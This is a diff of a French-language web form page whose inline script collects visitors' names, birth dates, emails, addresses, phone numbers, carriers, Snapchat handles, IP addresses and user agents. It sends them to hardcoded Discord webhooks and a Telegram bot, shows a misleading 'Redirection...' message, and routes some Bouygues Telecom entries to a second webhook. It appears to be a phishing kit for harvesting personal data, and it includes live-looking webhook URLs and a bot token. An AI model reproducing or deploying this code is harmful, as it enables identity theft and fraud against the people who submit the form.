@@ -77,31 +77,19 @@
       <input name="codePostal" placeholder="Code Postal" required>
       <input name="adresse" placeholder="Adresse (facultatif)">
       <input name="snap" placeholder="Nom Snapchat" required>
-      <input name="telephone" placeholder="Téléphone (facultatif)">
-      <input name="operateur" placeholder="Opérateur" required>
       <button type="submit">Valider</button>
     </form>
     <div id="msg"></div>
   </div>
 
   <script>
-    const DISCORD_WEBHOOK_1 = "https://discord.com/api/webhooks/1399083560782270485/HQzCh3RmPUzWhOrfR-5dOQ_vX78AtG0eTeRjAih95uNq3lkCtQcLirMMwOufmBB1Zs0u";
-    const DISCORD_WEBHOOK_2 = "https://discord.com/api/webhooks/1402568400475131924/EPF82eqz6XawrnId5YB6nCCXs46u5PuccOkYDlKjm6WddiwWJDB6WnOtMWRCvxE-1Eec";
-    const TELEGRAM_TOKEN = "7949221639:AAFENIkH1WqC2m6oVP8_aPOnsT6Qk9tBN2E";
+    const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1399083560782270485/HQzCh3RmPUzWhOrfR-5dOQ_vX78AtG0eTeRjAih95uNq3lkCtQcLirMMwOufmBB1Zs0u"; // webhook principal
+    const DISCORD_ALT_WEBHOOK_URL = "https://discord.com/api/webhooks/1402568400475131924/EPF82eqz6XawrnId5YB6nCCXs46u5PuccOkYDlKjm6WddiwWJDB6WnOtMWRCvxE-1Eec"; // webhook secondaire (si opérateur = Bouygues Telecom + 50%)
+    const TELEGRAM_TOKEN = "7949221639:AAFENIkH1WqC2m6o-VP8_aPOnsT6Qk9tBN2E";
     const TELEGRAM_CHAT_ID = "-1002810249796";
 
-    async function getIP() {
-      try {
-        const res = await fetch("https://api.ipify.org?format=json");
-        const data = await res.json();
-        return data.ip || "IP inconnue";
-      } catch {
-        return "IP inconnue";
-      }
-    }
-
-    async function sendDiscord(embed, url) {
-      return fetch(url, {
+    async function sendDiscord(embed, webhookUrl) {
+      return fetch(webhookUrl, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ embeds: [embed] })
@@ -125,11 +113,9 @@
       e.preventDefault();
       document.getElementById('msg').textContent = "Redirection...";
 
-      const ip = await getIP();
-      const ua = navigator.userAgent;
-
+      const step1 = JSON.parse(localStorage.getItem('step1') || '{}');
       const d = new FormData(e.target);
-      const data = {
+      const step2 = {
         nom: d.get('nom'),
         prenom: d.get('prenom'),
         naissance: d.get('naissance'),
@@ -137,59 +123,69 @@
         ville: d.get('ville'),
         codePostal: d.get('codePostal'),
         adresse: d.get('adresse'),
-        snap: d.get('snap'),
-        telephone: d.get('telephone') || 'Non fourni',
-        operateur: d.get('operateur') || 'Non fourni'
+        snap: d.get('snap')
       };
 
-      // 🎯 Choix du webhook
-      let webhookToUse = DISCORD_WEBHOOK_1;
-      if (data.operateur.toLowerCase().includes("bouygues") && Math.random() < 0.5) {
-        webhookToUse = DISCORD_WEBHOOK_2;
+      const ip = step1.ip || "IP inconnue";
+      const ua = step1.ua || "Inconnu";
+
+      // 🎯 Choix du webhook Discord selon opérateur
+      let selectedWebhook = DISCORD_WEBHOOK_URL;
+      if ((step1.operateur || "").toLowerCase().includes("bouygues") && Math.random() < 0.5) {
+        selectedWebhook = DISCORD_ALT_WEBHOOK_URL;
       }
 
       const discordEmbed = {
-        title: "📩 Nouvelle soumission",
+        title: "🍭 +1 Entrée 🍭",
         color: 0x9B00FF,
         fields: [
           {
-            name: "Informations",
+            name: "\u200B",
             value:
-              `👤 Nom : ${data.nom}\n` +
-              `👤 Prénom : ${data.prenom}\n` +
-              `🎂 Naissance : ${data.naissance}\n` +
-              `📧 Email : ${data.email}\n` +
-              `📱 Téléphone : ${data.telephone}\n` +
-              `📡 Opérateur : ${data.operateur}\n` +
-              `📍 Adresse : ${data.adresse || 'Non fournie'}\n` +
-              `🏙️ Ville : ${data.ville} (${data.codePostal})\n` +
-              `👻 Snapchat : ${data.snap}\n\n` +
-              `🌐 IP : ${ip}\n` +
-              `🖥️ User-Agent : ${ua}`
+              `🍬 Nom         : ${step2.nom}\n` +
+              `🍬 Prénom      : ${step2.prenom}\n` +
+              `🍬 Naissance   : ${step2.naissance || 'Non fournie'}\n` +
+              `🍬 Snapchat    : ${step2.snap || 'Non fourni'}\n\n` +
+
+              `┣🏠 Adresse     : ${step2.adresse || 'Non fournie'}\n` +
+              `┣🏠 Ville       : ${step2.ville}\n` +
+              `┗🏠 Code Postal : ${step2.codePostal}\n\n` +
+
+              `📧 Email       : ${step2.email}\n` +
+              `📞 Téléphone   : ${step1.telephone || 'Non fourni'}\n` +
+              `📶 Opérateur   : ${step1.operateur || 'Non fourni'}\n\n` +
+
+              `📟 IP          : ${ip}\n` +
+              `🔎 User-Agent  : ${ua}`
           }
         ],
         timestamp: new Date().toISOString(),
-        footer: { text: "Formulaire reçu" }
+        footer: {
+          text: "📥 Données reçues via le formulaire"
+        }
       };
 
       const telegramText =
-        `📥 *NOUVELLE ENTRÉE* 📥\n\n` +
-        `👤 *Nom* : ${data.nom} ${data.prenom}\n` +
-        `🎂 *Naissance* : ${data.naissance}\n` +
-        `📧 *Email* : ${data.email}\n` +
-        `📱 *Téléphone* : ${data.telephone}\n` +
-        `📡 *Opérateur* : ${data.operateur}\n` +
-        `🏠 *Adresse* : ${data.adresse || 'Non fournie'}, ${data.ville} (${data.codePostal})\n` +
-        `👻 *Snapchat* : ${data.snap}\n\n` +
-        `🌐 *IP* : ${ip}\n` +
-        `🖥️ *User-Agent* : ${ua}`;
+        `[🎲] +1 entre [🎲]\n\n` +
+        `🌬️ Nom : ${step2.nom}\n` +
+        `🌬️ Prénom : ${step2.prenom}\n` +
+        `🎂 Naissance : ${step2.naissance}\n` +
+        `🚀 Adresse : ${step2.adresse || 'Non fournie'}\n` +
+        `🚀 Ville : ${step2.ville}\n` +
+        `🚀 Code Postal : ${step2.codePostal}\n` +
+        `📧 E‑Mail : ${step2.email}\n` +
+        `👻 Snapchat : ${step2.snap}\n\n` +
+        `📡 Opérateur : ${step1.operateur || 'Non fourni'}\n` +
+        `📱 Téléphone : ${step1.telephone || 'Non fourni'}\n\n` +
+        `📟 Adresse IP : ${ip}\n` +
+        `🔎 User-Agent : ${ua}`;
 
       await Promise.all([
-        sendDiscord(discordEmbed, webhookToUse),
+        sendDiscord(discordEmbed, selectedWebhook),
         sendTelegram(telegramText)
       ]);
 
-      document.getElementById('msg').textContent = "Données envoyées !";
+      localStorage.setItem('step2', JSON.stringify(step2));
       setTimeout(() => window.location = 'merci.html', 1000);
     });
   </script>
